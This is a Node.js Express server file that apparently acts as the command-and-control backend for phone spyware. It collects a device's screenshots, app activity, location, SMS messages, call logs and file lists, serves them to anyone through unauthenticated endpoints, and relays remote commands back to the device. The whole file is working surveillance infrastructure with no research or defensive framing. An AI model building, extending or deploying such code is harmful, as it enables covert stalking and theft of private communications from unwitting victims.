const express = require("express");
const cors = require("cors");
const multer = require("multer");
const fs = require("fs");

const app = express();

// ==========================
// ✅ FIX: ensure folder exists
// ==========================
if (!fs.existsSync("screenshots")) {
    fs.mkdirSync("screenshots");
}

// ==========================
// ✅ ADVANCED CORS (FIXED)
// ==========================
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "*");
    res.header("Access-Control-Allow-Methods", "*");
    next();
});

app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use("/screenshots", express.static("screenshots"));

// ==========================
// 📸 MULTER SETUP (SAFE)
// ==========================
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, "screenshots/");
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + ".png");
    }
});

const upload = multer({ storage: storage });

// ==========================
// 📦 STORAGE
// ==========================
let logs = [];
let command = "";
let latestData = {};

let deviceData = {
    location: null,
    usage: [],
    camera: null,
    mic: null,
    sms: [],
    calls: [],
    files: [],
    lastSeen: null
};

// ==========================
// 📊 TRACK ACTIVITY (SAFE)
// ==========================
app.post("/track", upload.single("file"), (req, res) => {
    try {
        const data = {
            app: req.body.app || "Unknown",
            time: req.body.time || new Date().toLocaleString(),
            duration: req.body.duration || "0m 0s",
            screenshot: req.file ? req.file.filename : null
        };

        latestData = data;
        logs.unshift(data);

        if (logs.length > 200) logs.pop();

        console.log("📊 Data:", data);

        res.json({ ok: true });

    } catch (err) {
        console.log("❌ Track Error:", err);
        res.status(500).json({ error: "track failed" });
    }
});

// ==========================
// 📊 GET LOGS (🔥 FORCE JSON FIX)
// ==========================
app.get("/logs", (req, res) => {
    res.setHeader("Content-Type", "application/json");
    res.send(JSON.stringify(logs));
});

// ==========================
// 🔥 LATEST DATA
// ==========================
app.get("/data", (req, res) => {
    res.json(latestData);
});

// ==========================
// 🎮 COMMAND SYSTEM
// ==========================
app.post("/command", (req, res) => {
    command = req.body.command || "";
    console.log("🎮 Command:", command);
    res.json({ ok: true });
});

app.get("/get-command", (req, res) => {
    res.json({ command });
    command = "";
});

// ==========================
// 📍 LOCATION (SAFE)
// ==========================
app.post("/location", (req, res) => {
    try {
        deviceData.location = req.body;
        deviceData.lastSeen = new Date().toLocaleString();

        console.log("📍 Location:", req.body);

        res.json({ ok: true });

    } catch (err) {
        console.log("❌ Location Error:", err);
        res.status(500).json({ error: "location failed" });
    }
});

// ==========================
// 📩 SMS (FIXED DUPLICATE)
// ==========================
app.post("/sms", (req, res) => {
    deviceData.sms = req.body.sms || [];
    res.json({ ok: true });
});

app.get("/sms", (req, res) => {
    res.json(deviceData.sms);
});

// ==========================
// 📞 CALL LOGS
// ==========================
app.post("/calls", (req, res) => {
    deviceData.calls = req.body.calls || [];
    res.json({ ok: true });
});

app.get("/calls", (req, res) => {
    res.json(deviceData.calls);
});

// ==========================
// 📂 FILES
// ==========================
app.post("/files", (req, res) => {
    deviceData.files = req.body.files || [];
    res.json({ ok: true });
});

app.get("/files", (req, res) => {
    res.json(deviceData.files);
});

// ==========================
// 📤 DEVICE STATUS (IMPORTANT)
// ==========================
app.get("/device", (req, res) => {
    res.setHeader("Content-Type", "application/json");
    res.send(JSON.stringify(deviceData));
});

// ==========================
// ❤️ HEALTH
// ==========================
app.get("/", (req, res) => {
    res.send("✅ Server Running");
});

// ==========================
// 🔥 ERROR HANDLER
// ==========================
app.use((err, req, res, next) => {
    console.error("🔥 Server Error:", err);
    res.status(500).json({ error: "Server Error" });
});

// ==========================
// 🚀 START SERVER
// ==========================
app.listen(3000, "0.0.0.0", () => {
    console.log("🚀 Server running on http://0.0.0.0:3000");
});